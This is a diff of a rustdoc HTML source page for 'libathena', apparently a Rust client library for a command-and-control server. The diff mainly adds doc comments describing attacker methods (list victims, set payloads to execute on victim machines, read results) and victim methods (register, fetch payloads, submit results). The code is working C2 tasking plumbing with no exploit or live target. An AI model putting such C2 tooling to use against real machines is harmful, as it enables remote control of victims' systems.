@@ -168,6 +168,28 @@
 <span id="165">165</span>
 <span id="166">166</span>
 <span id="167">167</span>
+<span id="168">168</span>
+<span id="169">169</span>
+<span id="170">170</span>
+<span id="171">171</span>
+<span id="172">172</span>
+<span id="173">173</span>
+<span id="174">174</span>
+<span id="175">175</span>
+<span id="176">176</span>
+<span id="177">177</span>
+<span id="178">178</span>
+<span id="179">179</span>
+<span id="180">180</span>
+<span id="181">181</span>
+<span id="182">182</span>
+<span id="183">183</span>
+<span id="184">184</span>
+<span id="185">185</span>
+<span id="186">186</span>
+<span id="187">187</span>
+<span id="188">188</span>
+<span id="189">189</span>
 </pre><div class="example-wrap"><pre class="rust ">
 <span class="comment">/*
  * Copyright (C) 2021  Aravinth Manivannan &lt;realaravinth@batsense.net&gt;
@@ -201,6 +223,7 @@
 <span class="kw">use</span> <span class="ident">payload</span>::<span class="kw-2">*</span>;
 
 <span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Clone</span>, <span class="ident">Default</span>)]</span>
+<span class="doccomment">/// Client builder</span>
 <span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">AthenaClientBuilder</span> {
     <span class="ident">client</span>: <span class="prelude-ty">Option</span><span class="op">&lt;</span><span class="ident">Client</span><span class="op">&gt;</span>,
     <span class="ident">host</span>: <span class="prelude-ty">Option</span><span class="op">&lt;</span><span class="ident">String</span><span class="op">&gt;</span>,
@@ -208,16 +231,20 @@
 }
 
 <span class="kw">impl</span> <span class="ident">AthenaClientBuilder</span> {
+    <span class="doccomment">/// Set password to access athena C2 server</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">password</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>, <span class="ident">password</span>: <span class="ident">String</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">Self</span> {
         <span class="self">self</span>.<span class="ident">password</span> <span class="op">=</span> <span class="prelude-val">Some</span>(<span class="ident">Password</span> { <span class="ident">password</span> });
         <span class="self">self</span>
     }
 
+    <span class="doccomment">/// Provide client configuration</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">client</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>, <span class="ident">client</span>: <span class="ident">ClientBuilder</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span><span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">Self</span><span class="op">&gt;</span> {
         <span class="kw">let</span> <span class="ident">client</span> <span class="op">=</span> <span class="ident">client</span>.<span class="ident">cookie_store</span>(<span class="bool-val">true</span>).<span class="ident">build</span>()<span class="question-mark">?</span>;
         <span class="self">self</span>.<span class="ident">client</span> <span class="op">=</span> <span class="prelude-val">Some</span>(<span class="ident">client</span>);
         <span class="prelude-val">Ok</span>(<span class="self">self</span>)
     }
+
+    <span class="comment">// Set athena C2 server host</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">host</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>, <span class="ident">host</span>: <span class="ident">String</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">Self</span> {
         <span class="kw">if</span> <span class="ident">host</span>.<span class="ident">ends_with</span>(<span class="string">&#39;/&#39;</span>) {
             <span class="self">self</span>.<span class="ident">host</span> <span class="op">=</span> <span class="prelude-val">Some</span>(<span class="ident">host</span>[<span class="number">0</span>..<span class="ident">host</span>.<span class="ident">len</span>() <span class="op">-</span> <span class="number">1</span>].<span class="ident">to_owned</span>())
@@ -227,6 +254,7 @@
         <span class="self">self</span>
     }
 
+    <span class="comment">// Build client</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">build</span>(<span class="kw-2">&amp;</span><span class="kw-2">mut</span> <span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span><span class="ident">AthenaClient</span><span class="op">&gt;</span> {
         <span class="prelude-val">Ok</span>(<span class="ident">AthenaClient</span> {
             <span class="ident">client</span>: <span class="self">self</span>.<span class="ident">client</span>.<span class="ident">clone</span>().<span class="ident">unwrap</span>(),
@@ -237,6 +265,9 @@
 }
 
 <span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Clone</span>)]</span>
+<span class="doccomment">/// AthenaClient contains methods that are useful to both attackers and victims</span>
+<span class="doccomment">/// Methods applicable to the attacker role are prefixed with &quot;attacker&quot;</span>
+<span class="doccomment">/// Methods applicable to the victim role are prefixed with &quot;victim&quot;</span>
 <span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">AthenaClient</span> {
     <span class="ident">client</span>: <span class="ident">Client</span>,
     <span class="ident">host</span>: <span class="ident">Url</span>,
@@ -244,6 +275,7 @@
 }
 
 <span class="kw">impl</span> <span class="ident">AthenaClient</span> {
+    <span class="doccomment">/// Attacker: Get list of all victims currently available on the C2 server</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">attack_list_victims</span>(<span class="kw-2">&amp;</span><span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span><span class="ident">Vec</span><span class="op">&lt;</span><span class="ident">attack::Victim</span><span class="op">&gt;</span><span class="op">&gt;</span> {
         <span class="kw">let</span> <span class="ident">url</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">host</span>.<span class="ident">clone</span>().<span class="ident">join</span>(<span class="ident">V1_ROUTES</span>.<span class="ident">attack</span>.<span class="ident">list_victims</span>)<span class="question-mark">?</span>;
         <span class="prelude-val">Ok</span>(<span class="self">self</span>
@@ -256,6 +288,9 @@
             .<span class="kw">await</span><span class="question-mark">?</span>)
     }
 
+    <span class="doccomment">/// Attacker: Set payload that needs to be executed on a victim machine</span>
+    <span class="doccomment">/// A unique payload ID is returned. This ID is required to access the</span>
+    <span class="doccomment">/// payload&#39;s result</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">attack_set_payload</span>(
         <span class="kw-2">&amp;</span><span class="self">self</span>,
         <span class="ident">payload</span>: <span class="kw-2">&amp;</span><span class="ident">attack::Payload</span>,
@@ -270,6 +305,8 @@
         }
     }
 
+    <span class="doccomment">/// Attacker: Read result that was submitted by a victim machine.</span>
+    <span class="doccomment">/// Results are mapped against the payload ID.</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">attack_read_response</span>(
         <span class="kw-2">&amp;</span><span class="self">self</span>,
         <span class="ident">payload</span>: <span class="kw-2">&amp;</span><span class="ident">attack::PayloadID</span>,
@@ -288,16 +325,20 @@
         }
     }
 
+    <span class="doccomment">/// Attacker: Get configured password of the C2 server</span>
     <span class="kw">pub</span> <span class="kw">fn</span> <span class="ident">get_password</span>(<span class="kw-2">&amp;</span><span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="kw-2">&amp;</span><span class="ident">str</span> {
         <span class="kw-2">&amp;</span><span class="self">self</span>.<span class="ident">password</span>.<span class="ident">password</span>
     }
 
+    <span class="doccomment">/// Victim: Register victim on the C2 server</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">victim_register</span>(<span class="kw-2">&amp;</span><span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span>()<span class="op">&gt;</span> {
         <span class="kw">let</span> <span class="ident">url</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">host</span>.<span class="ident">clone</span>().<span class="ident">join</span>(<span class="ident">V1_ROUTES</span>.<span class="ident">victim</span>.<span class="ident">join</span>)<span class="question-mark">?</span>;
         <span class="self">self</span>.<span class="ident">client</span>.<span class="ident">post</span>(<span class="ident">url</span>).<span class="ident">send</span>().<span class="kw">await</span><span class="question-mark">?</span>;
         <span class="prelude-val">Ok</span>(())
     }
 
+    <span class="doccomment">/// Victim: Get all payloads that are yet to be executed on the victim machine.</span>
+    <span class="doccomment">/// Yet to be executed = No response submitted yet.</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">victim_get_paylod</span>(<span class="kw-2">&amp;</span><span class="self">self</span>) <span class="op">-</span><span class="op">&gt;</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span><span class="ident">victim::PayloadCollection</span><span class="op">&gt;</span> {
         <span class="kw">let</span> <span class="ident">url</span> <span class="op">=</span> <span class="self">self</span>.<span class="ident">host</span>.<span class="ident">clone</span>().<span class="ident">join</span>(<span class="ident">V1_ROUTES</span>.<span class="ident">victim</span>.<span class="ident">get_payload</span>)<span class="question-mark">?</span>;
         <span class="comment">//        Ok(self.client.post(url).send().await?.json().await?)</span>
@@ -312,6 +353,7 @@
         }
     }
 
+    <span class="doccomment">/// Victim: Submit payload&#39;s result</span>
     <span class="kw">pub</span> <span class="kw">async</span> <span class="kw">fn</span> <span class="ident">victim_set_payload_response</span>(
         <span class="kw-2">&amp;</span><span class="self">self</span>,
         <span class="ident">payload</span>: <span class="kw-2">&amp;</span><span class="ident">victim::PayloadResult</span>,
@@ -331,10 +373,12 @@
 
 <span class="attribute">#[<span class="ident">derive</span>(<span class="ident">Serialize</span>, <span class="ident">Error</span>, <span class="ident">Display</span>, <span class="ident">Debug</span>, <span class="ident">Deserialize</span>)]</span>
 <span class="attribute">#[<span class="ident">cfg</span>(<span class="ident">not</span>(<span class="ident">tarpaulin_include</span>))]</span>
+<span class="doccomment">/// Error value returned from the C2 server</span>
 <span class="kw">pub</span> <span class="kw">struct</span> <span class="ident">ErrorToResponse</span> {
     <span class="kw">pub</span> <span class="ident">error</span>: <span class="ident">String</span>,
 }
 
+<span class="doccomment">/// Result datatype used in libathena</span>
 <span class="kw">pub</span> <span class="kw">type</span> <span class="ident">AthenaResult</span><span class="op">&lt;</span><span class="ident">T</span><span class="op">&gt;</span> <span class="op">=</span> <span class="prelude-ty">Result</span><span class="op">&lt;</span><span class="ident">T</span>, <span class="ident">Box</span><span class="op">&lt;</span><span class="kw">dyn</span> <span class="ident">Error</span><span class="op">&gt;</span><span class="op">&gt;</span>;
 </pre></div>
 </section><section id="search" class="content hidden"></section><div id="rustdoc-vars" data-root-path="../../" data-current-crate="libathena" data-search-index-js="../../search-index.js" data-search-js="../../search.js"></div>
